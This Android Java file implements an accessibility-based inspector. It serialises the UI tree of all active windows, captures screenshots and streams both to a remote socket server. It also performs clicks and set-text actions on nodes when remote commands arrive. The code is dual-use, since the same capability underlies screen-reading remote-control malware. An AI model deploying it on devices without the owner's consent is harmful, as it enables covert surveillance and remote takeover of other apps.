package com.fason.app.features.inspector;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import io.socket.client.Socket;

public class InspectorAccessibilityService {
    private static final String TAG = "InspectorA11y";
    private static volatile InspectorAccessibilityService helperInstance;
    private static volatile FasonAccessibilityService host;
    private static final int MAX_DEPTH = 50;
    private final AtomicInteger idCounter = new AtomicInteger(0);
    private final Map<Integer, AccessibilityNodeInfo> nodeIdMap = new ConcurrentHashMap<>();
    private volatile android.os.HandlerThread screenshotThread;
    private volatile android.os.Handler screenshotHandler;

    public static void onHostConnected(FasonAccessibilityService h) {
        host = h;
        helperInstance = new InspectorAccessibilityService();
        helperInstance.screenshotThread = new android.os.HandlerThread("InspectorShot");
        helperInstance.screenshotThread.start();
        helperInstance.screenshotHandler = new android.os.Handler(helperInstance.screenshotThread.getLooper());
        Log.i(TAG, "Inspector attached");
    }

    public static void onHostDisconnected() {
        if (helperInstance != null) {
            helperInstance.recycleNodeMap();
            if (helperInstance.screenshotThread != null) {
                helperInstance.screenshotThread.quitSafely();
                helperInstance.screenshotThread = null;
            }
            helperInstance.screenshotHandler = null;
        }
        helperInstance = null;
        host = null;
    }

    public static void onAccessibilityEvent(AccessibilityEvent event) {
        if (helperInstance == null || event == null) return;
        if (event.getEventType() == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
            List<CharSequence> texts = event.getText();
            if (texts != null) {
                for (CharSequence cs : texts) {
                    if (cs != null && cs.toString().trim().length() > 0) {
                        helperInstance.sendAnnouncement(cs.toString().trim());
                    }
                }
            }
        }
    }

    public static InspectorAccessibilityService getInstance() {
        return helperInstance;
    }

    public static boolean isServiceConnected() {
        return helperInstance != null;
    }

    public static boolean isEnabled() {
        return FasonAccessibilityService.isEnabled();
    }

    public static void openSettings() {
        FasonAccessibilityService.openSettings();
    }

    public void captureInspectorTree(boolean includeAll, String cmdId) {
        Log.i(TAG, "Capture requested, includeAll=" + includeAll);
        idCounter.set(0);
        synchronized (nodeIdMap) {
            recycleNodeMap();
        }
        try {
            final FasonAccessibilityService h = host;
            JSONArray windowArray = new JSONArray();
            List<AccessibilityWindowInfo> windows = h != null ? h.getWindows() : null;
            if (windows != null) {
                for (AccessibilityWindowInfo window : windows) {
                    if (window == null || !window.isActive()) continue;
                    AccessibilityNodeInfo root = window.getRoot();
                    if (root == null) continue;
                    JSONObject windowObj = new JSONObject();
                    JSONObject windowMeta = new JSONObject();
                    try {
                        windowMeta.put("role", "Window");
                        windowMeta.put("windowId", window.getId());
                        CharSequence title = window.getTitle();
                        if (title != null) windowMeta.put("title", title.toString());
                        Rect bounds = new Rect();
                        root.getBoundsInScreen(bounds);
                        windowMeta.put("x1", bounds.left);
                        windowMeta.put("y1", bounds.top);
                        windowMeta.put("x2", bounds.right);
                        windowMeta.put("y2", bounds.bottom);
                        windowObj.put("name", "Window");
                        windowObj.put("metadata", windowMeta);
                    } catch (Exception ignored) {}
                    HashSet<AccessibilityNodeInfo> seen = new HashSet<>();
                    JSONArray windowChildren = new JSONArray();
                    serializeNode(root, windowChildren, seen, includeAll, 0);
                    if (windowChildren.length() > 0) {
                        try {
                            JSONObject firstChild = windowChildren.getJSONObject(0);
                            windowObj.put("id", firstChild.getInt("id"));
                        } catch (Exception ignored) {}
                        windowObj.put("children", windowChildren);
                    } else {
                        continue;
                    }
                    windowArray.put(windowObj);
                }
            }
            JSONObject treePayload = new JSONObject();
            treePayload.put("children", windowArray);
            sendInspectorEvent("tree", treePayload, null, cmdId);
            takeInspectorScreenshot(cmdId);
        } catch (Exception e) {
            Log.e(TAG, "Capture failed", e);
            sendErrorEvent(cmdId, e.getMessage() != null ? e.getMessage() : "capture failed");
        }
    }

    private void takeInspectorScreenshot(String cmdId) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            sendInspectorEvent("screenshot_error", null, null, cmdId);
            return;
        }
        final FasonAccessibilityService h = host;
        if (h == null) {
            sendInspectorEvent("screenshot_error", null, null, cmdId);
            return;
        }
        try {
            h.takeScreenshot(Display.DEFAULT_DISPLAY, screenshotHandler::post,
                new AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(AccessibilityService.ScreenshotResult result) {
                        HardwareBuffer hb = null;
                        try {
                            hb = result.getHardwareBuffer();
                            android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(
                                hb, result.getColorSpace());
                            if (bitmap == null) {
                                sendInspectorEvent("screenshot_error", null, null, cmdId);
                                return;
                            }
                            android.graphics.Bitmap soft = bitmap.copy(
                                android.graphics.Bitmap.Config.ARGB_8888, false);
                            try { bitmap.recycle(); } catch (Exception ignored) {}
                            if (soft == null) {
                                sendInspectorEvent("screenshot_error", null, null, cmdId);
                                return;
                            }
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            soft.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos);
                            soft.recycle();
                            String b64 = android.util.Base64.encodeToString(
                                baos.toByteArray(), android.util.Base64.NO_WRAP);
                            sendInspectorEvent("screenshot", null, b64, cmdId);
                        } catch (Exception e) {
                            Log.e(TAG, "Screenshot processing failed", e);
                            sendInspectorEvent("screenshot_error", null, null, cmdId);
                        } finally {
                            if (hb != null) {
                                try { hb.close(); } catch (Exception ignored) {}
                            }
                        }
                    }
                    @Override
                    public void onFailure(int errorCode) {
                        Log.e(TAG, "Screenshot failed: error " + errorCode);
                        sendInspectorEvent("screenshot_error", null, null, cmdId);
                    }
                });
        } catch (Exception e) {
            Log.e(TAG, "takeScreenshot failed", e);
            sendInspectorEvent("screenshot_error", null, null, cmdId);
        }
    }
    private void serializeNode(AccessibilityNodeInfo node,
                                JSONArray parentArray,
                                HashSet<AccessibilityNodeInfo> seen,
                                boolean includeAll,
                                int depth) {
        if (node == null) return;
        if (!seen.add(node)) return;
        if (depth > MAX_DEPTH) return;
        try {
            JSONObject nodeObj = new JSONObject();
            JSONObject meta = new JSONObject();
            int nodeId = registerNode(node);
            nodeObj.put("id", nodeId);
            CharSequence cls = node.getClassName();
            String roleName = "View";
            if (cls != null) {
                String fullCls = cls.toString();
                int dot = fullCls.lastIndexOf('.');
                roleName = dot >= 0 ? fullCls.substring(dot + 1) : fullCls;
            }
            meta.put("role", roleName);
            nodeObj.put("name", roleName);
            Rect rect = new Rect();
            node.getBoundsInScreen(rect);
            meta.put("x1", rect.left);
            meta.put("y1", rect.top);
            meta.put("x2", rect.right);
            meta.put("y2", rect.bottom);
            final FasonAccessibilityService h = host;
            float density = h != null ? h.getResources().getDisplayMetrics().density : 2.0f;
            int widthPx = rect.width();
            int heightPx = rect.height();
            meta.put("scaledWidth", String.format(Locale.US, "%.2f", widthPx / density));
            meta.put("scaledHeight", String.format(Locale.US, "%.2f", heightPx / density));
            meta.put("dpScaleFactor", String.format(Locale.US, "%.2f", density));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                String resId = node.getViewIdResourceName();
                if (resId != null) meta.put("resourceId", resId);
            }
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) meta.put("text", text.toString().trim());
            CharSequence desc = node.getContentDescription();
            if (desc != null) meta.put("content", desc.toString().trim());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                CharSequence tooltip = node.getTooltipText();
                if (tooltip != null) meta.put("tooltip", tooltip.toString());
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                CharSequence paneTitle = node.getPaneTitle();
                if (paneTitle != null) meta.put("paneTitle", paneTitle.toString());
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                CharSequence hint = node.getHintText();
                if (hint != null) meta.put("hint", hint.toString());
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    AccessibilityNodeInfo labeledBy = node.getLabeledBy();
                    if (labeledBy != null) {
                        CharSequence labelText = labeledBy.getText();
                        if (labelText == null) labelText = labeledBy.getContentDescription();
                        if (labelText != null && labelText.length() > 0) {
                            meta.put("labeledBy", labelText.toString().trim());
                        }
                        meta.put("labeledById", registerNode(labeledBy));
                    }
                } catch (Exception ignored) {}
                try {
                    AccessibilityNodeInfo labelFor = node.getLabelFor();
                    if (labelFor != null) {
                        meta.put("labelForId", registerNode(labelFor));
                    }
                } catch (Exception ignored) {}
            }
            try {
                android.text.style.ClickableSpan[] spans = null;
                if (text instanceof android.text.Spannable) {
                    spans = ((android.text.Spannable) text).getSpans(0, text.length(), android.text.style.ClickableSpan.class);
                }
                if (spans != null && spans.length > 0) {
                    JSONArray linkArray = new JSONArray();
                    for (android.text.style.ClickableSpan span : spans) {
                        if (text instanceof android.text.Spannable) {
                            int start = ((android.text.Spannable) text).getSpanStart(span);
                            int end = ((android.text.Spannable) text).getSpanEnd(span);
                            if (start >= 0 && end > start && end <= text.length()) {
                                linkArray.put(text.subSequence(start, end).toString());
                            }
                        }
                    }
                    if (linkArray.length() > 0) meta.put("links", linkArray);
                }
            } catch (Exception ignored) {}
            try {
                if (text instanceof android.text.Spannable) {
                    android.text.style.LocaleSpan[] localeSpans =
                        ((android.text.Spannable) text).getSpans(0, text.length(), android.text.style.LocaleSpan.class);
                    if (localeSpans != null && localeSpans.length > 0) {
                        JSONArray localeArray = new JSONArray();
                        for (android.text.style.LocaleSpan ls : localeSpans) {
                            java.util.Locale loc = ls.getLocale();
                            int start = ((android.text.Spannable) text).getSpanStart(ls);
                            int end = ((android.text.Spannable) text).getSpanEnd(ls);
                            String snippet = (start >= 0 && end > start && end <= text.length())
                                ? text.subSequence(start, end).toString() : "";
                            String tag = loc != null ? loc.toLanguageTag() : "unknown";
                            if (!snippet.isEmpty()) {
                                localeArray.put(snippet + " - " + tag);
                            } else {
                                localeArray.put(tag);
                            }
                        }
                        if (localeArray.length() > 0) meta.put("locales", localeArray);
                    }
                }
            } catch (Exception ignored) {}
            if (node.isCheckable()) {
                meta.put("checkable", node.isChecked() ? "checked" : "not checked");
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                CharSequence stateDesc = node.getStateDescription();
                if (stateDesc != null) meta.put("stateDescription", stateDesc.toString());
            }
            if (node.isSelected()) meta.put("selected", true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (node.isContentInvalid()) meta.put("contentInvalid", true);
                CharSequence error = node.getError();
                if (error != null) meta.put("errorMessage", error.toString());
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (node.isHeading()) meta.put("heading", true);
            }
            if (!node.isVisibleToUser()) meta.put("visibility", "invisible");
            meta.put("importantForAccessibility", node.isImportantForAccessibility());
            List<String> props = new ArrayList<>();
            if (node.isClickable()) props.add("clickable");
            if (node.isLongClickable()) props.add("longClickable");
            if (node.isFocusable()) props.add("focusable");
            if (node.isFocused()) props.add("focused");
            if (node.isAccessibilityFocused()) props.add("accessibility focused");
            if (node.isScrollable()) props.add("scrollable");
            if (node.isEnabled()) props.add("enabled");
            if (node.isPassword()) props.add("password");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (node.isEditable()) props.add("editable");
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (node.isMultiLine()) props.add("multiLine");
            }
            if (node.isSelected()) props.add("selected");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                try {
                    if (node.isScreenReaderFocusable()) props.add("screenReaderFocusable");
                } catch (Exception ignored) {}
            }
            if (!props.isEmpty()) meta.put("properties", new JSONArray(props));
            List<String> actions = new ArrayList<>();
            try {
                for (AccessibilityNodeInfo.AccessibilityAction action : node.getActionList()) {
                    if (action == null) continue;
                    int actionId = action.getId();
                    String standardName = actionIdToName(actionId);
                    boolean isCustom = standardName == null || standardName.startsWith("action_");
                    CharSequence label = action.getLabel();
                    if (label != null && label.length() > 0) {
                        String labelStr = label.toString();
                        if (isCustom) {
                            actions.add(labelStr + " (custom)");
                        } else {
                            actions.add(labelStr);
                        }
                    } else if (!isCustom) {
                        actions.add(standardName);
                    }
                }
            } catch (Exception ignored) {}
            if (!actions.isEmpty()) meta.put("actions", new JSONArray(actions));
            AccessibilityNodeInfo.CollectionInfo coll = node.getCollectionInfo();
            if (coll != null) {
                meta.put("collectionInfo", coll.getRowCount() + "x" + coll.getColumnCount());
            }
            AccessibilityNodeInfo.CollectionItemInfo item = node.getCollectionItemInfo();
            if (item != null) {
                meta.put("collectionItemInfo", item.getRowIndex() + "," + item.getColumnIndex());
            }
            nodeObj.put("metadata", meta);
            if (node.getChildCount() > 0) {
                JSONArray childrenArray = new JSONArray();
                for (int i = 0; i < node.getChildCount(); i++) {
                    AccessibilityNodeInfo child = node.getChild(i);
                    if (child != null) {
                        if (depth + 1 > MAX_DEPTH) {
                            try { child.recycle(); } catch (Exception ignored) {}
                            continue;
                        }
                        serializeNode(child, childrenArray, seen, includeAll, depth + 1);
                    }
                }
                if (childrenArray.length() > 0) {
                    nodeObj.put("children", childrenArray);
                }
            }
            parentArray.put(nodeObj);
        } catch (Exception e) {
            Log.w(TAG, "serializeNode failed", e);
        }
    }

    public void performNodeAction(int nodeId, int actionId, String text, String cmdId) {
        try {
            AccessibilityNodeInfo target;
            synchronized (nodeIdMap) {
                target = nodeIdMap.get(nodeId);
                if (target == null) {
                    sendErrorEvent(cmdId, "Node not found (stale ID - re-capture and try again)", "action_error");
                    return;
                }
                boolean ok;
                if (actionId == 0x00200000 && text != null) {
                    Bundle args = new Bundle();
                    args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                    ok = target.performAction(actionId, args);
                } else {
                    ok = target.performAction(actionId);
                }
                JSONObject result = new JSONObject();
                result.put("success", ok);
                result.put("action", actionIdToName(actionId));
                sendInspectorEvent("action_result", result, null, cmdId);
            }
        } catch (Exception e) {
            sendErrorEvent(cmdId, e.getMessage() != null ? e.getMessage() : "action failed", "action_error");
        }
    }

    private int registerNode(AccessibilityNodeInfo node) {
        int id = idCounter.incrementAndGet();
        nodeIdMap.put(id, node);
        return id;
    }

    private void recycleNodeMap() {
        for (AccessibilityNodeInfo node : nodeIdMap.values()) {
            try { node.recycle(); } catch (Exception ignored) {}
        }
        nodeIdMap.clear();
    }

    private static String actionIdToName(int id) {
        if (id == 0x00000010) return "click";
        if (id == 0x00000020) return "long click";
        if (id == 0x00000001) return "focus";
        if (id == 0x00000002) return "clear focus";
        if (id == 0x00000004) return "select";
        if (id == 0x00000008) return "clear selection";
        if (id == 0x00001000) return "scroll forward";
        if (id == 0x00002000) return "scroll backward";
        if (id == 0x00400000) return "scroll up";
        if (id == 0x00800000) return "scroll down";
        if (id == 0x01000000) return "scroll left";
        if (id == 0x02000000) return "scroll right";
        if (id == 0x00200000) return "set text";
        if (id == 0x00080000) return "collapse";
        if (id == 0x00040000) return "expand";
        if (id == 0x00000400) return "dismiss";
        if (id == 0x00004000) return "copy";
        if (id == 0x00008000) return "paste";
        if (id == 0x00010000) return "cut";
        return "action_" + id;
    }

    private void sendInspectorEvent(String type, JSONObject payload, String screenshotB64, String cmdId) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TYPE, type);
            if (payload != null) {
                if ("tree".equals(type)) {
                    data.put(Protocol.KEY_TREE, payload);
                } else {
                    JSONArray names = payload.names();
                    if (names != null) {
                        for (int i = 0; i < names.length(); i++) {
                            String key = names.getString(i);
                            data.put(key, payload.get(key));
                        }
                    }
                }
            }
            if (screenshotB64 != null) data.put(Protocol.KEY_SCREENSHOT, screenshotB64);
            if (cmdId != null) data.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.INSPECTOR, data);
        } catch (Exception ignored) {}
    }

    private void sendErrorEvent(String cmdId, String message) {
        sendErrorEvent(cmdId, message, "error");
    }

    private void sendErrorEvent(String cmdId, String message, String type) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TYPE, type);
            data.put(Protocol.KEY_ERROR, message);
            if (cmdId != null) data.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.INSPECTOR, data);
        } catch (Exception ignored) {}
    }

    private void sendAnnouncement(String message) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TYPE, "announcement");
            data.put(Protocol.KEY_ANNOUNCEMENT, message);
            data.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            socket.emit(Protocol.INSPECTOR, data);
        } catch (Exception ignored) {}
    }
}
